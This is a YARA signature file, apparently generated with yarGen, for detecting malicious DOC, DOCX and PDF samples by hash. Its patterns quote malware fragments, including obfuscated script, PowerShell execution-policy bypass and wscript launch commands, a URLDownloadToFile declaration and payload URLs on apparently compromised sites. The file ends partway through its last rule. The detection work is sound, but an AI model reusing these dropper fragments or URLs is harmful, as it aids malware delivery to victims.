/*
   YARA Rule Set
   Author: RamonOrtiz
   Date: 2021-08-06
   Identifier: DOC
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8 {
   meta:
      description = "DOC - file f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s4 = "62617365203D2043726561746522202B20766C736F73767569" ascii /* hex encoded string 'base = Create" + vlsosvui' */
      $s5 = "2C20424C4E5155314945542C20424C4E5749314E444F57534F" ascii /* hex encoded string ', BLNQU1IET, BLNWI1NDOWSO' */
      $s6 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s7 = "33342A283334363337383533342D333436333734292B343833" ascii /* hex encoded string '34*(346378534-346374)+483' */
      $s8 = "52312C2041525249314E54434D442C204152525431454D502C" ascii /* hex encoded string 'R1, ARRI1NTCMD, ARRT1EMP,' */
      $s9 = "535452433153445645522C205354523146494C452C20535452" ascii /* hex encoded string 'STRC1SDVER, STR1FILE, STR' */
      $s10 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s11 = "2E6F70656E22202B20766243724C66202B20222E7772697465" ascii /* hex encoded string '.open" + vbCrLf + ".write' */
      $s12 = "34634746755A455675646D6C22202B202279623235745A5735" ascii /* hex encoded string '4cGFuZEVudml" + "yb25tZW5' */
      $s13 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s14 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s15 = "2053545248454C5053484F52542C20535452484541442C2053" ascii /* hex encoded string ' STRHELPSHORT, STRHEAD, S' */
      $s16 = "6B737664756966757767727765203D20226578656375746528" ascii /* hex encoded string 'ksvduifuwgrwe = "execute(' */
      $s17 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s18 = "202020202020202020202020626161782E54797065203D2032" ascii /* hex encoded string '            baax.Type = 2' */
      $s19 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s20 = "6173652E4E6F6465547970656456616C7565203D2053747254" ascii /* hex encoded string 'ase.NodeTypedValue = StrT' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33 {
   meta:
      description = "DOC - file e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s4 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s5 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s6 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s7 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s8 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s9 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s10 = "3269337230323975347234336A3839756F746A663839336A74" ascii /* hex encoded string '2i3r029u4r43j89uotjf893jt' */
      $s11 = "7230323975347234336A3839756F746A663839336A74203D20" ascii /* hex encoded string 'r029u4r43j89uotjf893jt = ' */
      $s12 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s13 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s14 = "3534332B333435383638393332343732332A32373835363334" ascii /* hex encoded string '543+3458689324723*2785634' */
      $s15 = "3633343837353433362F32353637353437363234372D323736" ascii /* hex encoded string '634875436/25675476247-276' */
      $s16 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s17 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s18 = "372F323238393537343534332B333435383638393332343732" ascii /* hex encoded string '7/2289574543+345868932472' */
      $s19 = "38333635362F32373436373538393635343635342B34333433" ascii /* hex encoded string '83656/27467589654654+4343' */
      $s20 = "6A663839336A74203D2022323433323432332A323334353335" ascii /* hex encoded string 'jf893jt = "2432423*234535' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694 {
   meta:
      description = "DOC - file 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s4 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s5 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s6 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s7 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s8 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s9 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s10 = "3269337230323975347234336A3839756F746A663839336A74" ascii /* hex encoded string '2i3r029u4r43j89uotjf893jt' */
      $s11 = "7230323975347234336A3839756F746A663839336A74203D20" ascii /* hex encoded string 'r029u4r43j89uotjf893jt = ' */
      $s12 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s13 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s14 = "3534332B333435383638393332343732332A32373835363334" ascii /* hex encoded string '543+3458689324723*2785634' */
      $s15 = "3633343837353433362F32353637353437363234372D323736" ascii /* hex encoded string '634875436/25675476247-276' */
      $s16 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s17 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s18 = "372F323238393537343534332B333435383638393332343732" ascii /* hex encoded string '7/2289574543+345868932472' */
      $s19 = "6A663839336A74203D2022323433323432332A323334353335" ascii /* hex encoded string 'jf893jt = "2432423*234535' */
      $s20 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7 {
   meta:
      description = "DOC - file 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s4 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s5 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s6 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s7 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s8 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s9 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s10 = "3269337230323975347234336A3839756F746A663839336A74" ascii /* hex encoded string '2i3r029u4r43j89uotjf893jt' */
      $s11 = "7230323975347234336A3839756F746A663839336A74203D20" ascii /* hex encoded string 'r029u4r43j89uotjf893jt = ' */
      $s12 = "72666769626766626E667237203D2022393339333935373337" ascii /* hex encoded string 'rfgibgfbnfr7 = "939395737' */
      $s13 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s14 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s15 = "35347662347866673679787967627975363772666769626766" ascii /* hex encoded string '54vb4xfg6yxygbyu67rfgibgf' */
      $s16 = "3534332B333435383638393332343732332A32373835363334" ascii /* hex encoded string '543+3458689324723*2785634' */
      $s17 = "3633343837353433362F32353637353437363234372D323736" ascii /* hex encoded string '634875436/25675476247-276' */
      $s18 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s19 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s20 = "372F323238393537343534332B333435383638393332343732" ascii /* hex encoded string '7/2289574543+345868932472' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619 {
   meta:
      description = "DOC - file 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s4 = "33342A283334363337383533342D333436333734292B343833" ascii /* hex encoded string '34*(346378534-346374)+483' */
      $s5 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s6 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s7 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s8 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s9 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s10 = "3269337230323975347234336A3839756F746A663839336A74" ascii /* hex encoded string '2i3r029u4r43j89uotjf893jt' */
      $s11 = "7230323975347234336A3839756F746A663839336A74203D20" ascii /* hex encoded string 'r029u4r43j89uotjf893jt = ' */
      $s12 = "72666769626766626E667237203D2022393339333935373337" ascii /* hex encoded string 'rfgibgfbnfr7 = "939395737' */
      $s13 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s14 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s15 = "3534332B333435383638393332343732332A32373835363334" ascii /* hex encoded string '543+3458689324723*2785634' */
      $s16 = "3633343837353433362F32353637353437363234372D323736" ascii /* hex encoded string '634875436/25675476247-276' */
      $s17 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s18 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s19 = "6E667237203D202239333933393537333734332A3334333634" ascii /* hex encoded string 'nfr7 = "93939573743*34364' */
      $s20 = "372F323238393537343534332B333435383638393332343732" ascii /* hex encoded string '7/2289574543+345868932472' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e {
   meta:
      description = "DOC - file 5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e.pdf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e"
   strings:
      $s1 = "qqqqyy" fullword ascii /* reversed goodware string 'yyqqqq' */
      $s2 = "            xmlns:pdfx=\"http://ns.adobe.com/pdfx/1.3/\">" fullword ascii
      $s3 = "            xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"" fullword ascii
      $s4 = "            xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\"" fullword ascii
      $s5 = "            xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\"" fullword ascii
      $s6 = "SSS%%%" fullword ascii /* reversed goodware string '%%%SSS' */
      $s7 = "<</ADBE_FT<</BreadCrumbs[<</Action(Set)/AppVersion(1)/Application(PDFMaker)/PDFLBuildDate(Sep 13 2017)/TimeStamp(D:2018040402162" ascii
      $s8 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><1AD6BA2816860940A3E900A4AF919" ascii
      $s9 = "<</DecodeParms<</Columns 5/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><FE29CC1D5A17A14F80B1C5EC8AB6A" ascii
      $s10 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><D9D209A6167CF34F959B5B43E7E2A" ascii
      $s11 = "111)))" fullword ascii /* reversed goodware string ')))111' */
      $s12 = "0R3R1R2R0" fullword ascii /* base64 encoded string 'GtuGdt' */
      $s13 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><B6F9C974D0AF734F856F33AD2E6A1" ascii
      $s14 = "W)))!!!" fullword ascii
      $s15 = "<</JS 533 0 R/S/JavaScript>>" fullword ascii
      $s16 = "<</Differences[24/breve/caron/circumflex/dotaccent/hungarumlaut/ogonek/ring/tilde 39/quotesingle 96/grave 128/bullet/dagger/dagg" ascii
      $s17 = "<</JS 530 0 R/S/JavaScript>>" fullword ascii
      $s18 = "<</JS 508 0 R/S/JavaScript>>" fullword ascii
      $s19 = "<</JS 536 0 R/S/JavaScript>>" fullword ascii
      $s20 = "<</EmbeddedFiles 497 0 R/JavaScript 493 0 R>>" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 2000KB and
      8 of them
}

rule sig_8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625 {
   meta:
      description = "DOC - file 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide
      $s3 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\MSWORD.OLB#Microsoft" wide
      $s4 = "cmd /c " fullword ascii
      $s5 = "cmd /c \"8 & " fullword ascii
      $s6 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s7 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s8 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide
      $s9 = "\\zx.tmp" fullword ascii
      $s10 = "rundll32 " fullword ascii
      $s11 = ": dvtu.customs.ru/index.php?option=com_content&view=category&id=80 " fullword wide
      $s12 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii
      $s13 = "53&75&5B~" fullword ascii /* hex encoded string 'Su[' */
      $s14 = "r Eastern regions of Russia and the countries of the Korean peninsula. There were revealed reasons for the slowing of economic c" ascii
      $s15 = "ooperation. It is concluded that the international economic sanctions did not reduce the interest of the Korean states in cooper" ascii
      $s16 = ". 225-226]. " fullword wide /* hex encoded string '"R&' */
      $s17 = "4870605,7" fullword wide /* hex encoded string 'Hp`W' */
      $s18 = "@MickeyB" fullword ascii
      $s19 = "Keywords: Russia " fullword ascii
      $s20 = "USERPROF`ILE\")" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 400KB and
      8 of them
}

rule d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f {
   meta:
      description = "DOC - file d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $x1 = "var key = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; function de(input) { output = \"\"; i = 0; inpu" ascii
      $x2 = "js\"); findit(argv(0), \"\\\"^QWRkL\\\"\", \"y.ps1\"); sh.Run(\"wscript.exe yy.js\", 0); sh.Run(\"powershell.exe -ep bypass -f ." ascii
      $x3 = "sh.Run(s, 0); fs = new ActiveXObject(\"Scripting.FileSystemObject\"); while (1) { WScript.Sleep(10); if (!fs.FileExists(\"temp.t" ascii
      $x4 = " function findit(input, pattern, output) { s = \"cmd /c findstr /r \" + pattern + \" \\\"\" + input + \"\\\" > temp.txt\"; " fullword ascii
      $s5 = ")) { continue; } f = fs.GetFile(\"temp.txt\"); if (f.Size) { ts = f.OpenAsTextStream(1, -2); s = ts.ReadAll(); ts.Close(); break" ascii
      $s6 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.7#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE15\\MSO.DLL#Microsoft " wide
      $s7 = "cmd /c cd /d %USERPROFILE% && type \"5" fullword ascii
      $s8 = "sh.Run(s, 0); fs = new ActiveXObject(\"Scripting.FileSystemObject\"); while (1) { WScript.Sleep(10); if (!fs.FileExists(\"temp.t" ascii
      $s9 = "YyBzdGF0aWMgZXh0ZXJuIGxvbmcgVVJMRG93bmxvYWRUb0ZpbGUoSW50UHRyIHBDYWxsZXIsIHN0cmluZyBzdHJVUkwsIHN0cmluZyBzdHJGaWxlTmFtZSwgdWludCB1" ascii /* base64 encoded string 'c static extern long URLDownloadToFile(IntPtr pCaller, string strURL, string strFileName, uint u' */
      $s10 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s11 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
      $s12 = "\" | findstr /r \"^var\" > y.js && wscript y.js \"" fullword ascii
      $s13 = "MSO.DLL#" fullword ascii
      $s14 = "input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\"); do { enc1 = key.indexOf(input.charAt(i++)); enc2 = key.indexOf(input.charAt(i++))" ascii
      $s15 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s16 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s17 = "fs.DeleteFile(\"temp.txt\"); }} catch (e) {}" fullword ascii
      $s18 = "JSAmJiBkZWwgL2YgL3EgeS4qIiwgMCk7" fullword ascii /* base64 encoded string '% && del /f /q y.*", 0);' */
      $s19 = "*\\G{00020905-0000-0000-C000-000000000046}#8.6#0#C:\\Program Files\\Microsoft Office\\Office15\\MSWORD.OLB#Microsoft Word 15.0 O" wide
      $s20 = "h); return output; } try { argv = WScript.Arguments; sh = new ActiveXObject(\"WScript.Shell\"); findit(argv(0), \"\\\"^dHJ5I\\\"" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a {
   meta:
      description = "DOC - file 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
   strings:
      $x1 = "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Word\\protection.png" fullword wide
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
      $s3 = "brlakedrugs.com/wp-content/themes/twentyseventeen/template-parts/footer/0Zy3@U3*mTL3hUtu.php" fullword ascii
      $s4 = "agrege homologoumena profunditymonogrammerinoperabi ascriptions amorino mediated" fullword ascii
      $s5 = "rphyroidsskeesbitum geologizeegestions noninfected oolitic bibliograp posteriorlybureaucraticjehadis antherozooid amenableness a" ascii
      $s6 = "https://thegoldprocess=:ClegU.co=:ClegUm/uploa=:ClegUds=:ClegU/=:ClegUblog/8xFQnsDivjqalDy.php" fullword ascii
      $s7 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s8 = "reinjectedincompleteness literatelyantiferromagnetswatt jarovizingtrotyl lazing tal" fullword ascii
      $s9 = "rockboundunisonancespranayamac chambertemperamentallycurtness loamedveriestheyedbilkers lotuslandsanalytici" fullword ascii
      $s10 = "centenarianisms encoded gander idolatryarmipotencesdedramatiz laborer sterling fragile under re" fullword ascii
      $s11 = "unavoidablescripturesadjustmen polarisedparalogisticconstitue volumometers boasted" fullword ascii
      $s12 = "substractionsrundlesauthorisms swashbuckled chloasma allogr" fullword ascii
      $s13 = "alinising irrenowned lyrists nimblessebalancenonexecutivesr cubismskababbingferr" fullword ascii
      $s14 = "https://!+qFl+;www.t!+qFl+;hew!+qFl+;ordmarvel.com/wp-admin/OdvB!+qFl+;FxAFpv15Pc5.php" fullword ascii
      $s15 = "midrib tibias etheriseshellosokes hoarding iconophilists" fullword ascii
      $s16 = "picilyhomologfuzztones mealieyestreenprogramingrumina yeading santoors" fullword ascii
      $s17 = "directors waygoose counterspyings impostedprocto" fullword ascii
      $s18 = "vegetativevassail baselesslyferrocyanicbacteriop pustules pheezed disilluminate sociobiology alc" fullword ascii
      $s19 = "al physiopathologypostillatessub" fullword ascii
      $s20 = "ali kroonsaxonitesenhypostatising logogriphic fustic" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c {
   meta:
      description = "DOC - file 199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c"
   strings:
      $s1 = "customXml/itemProps1.xml " fullword ascii
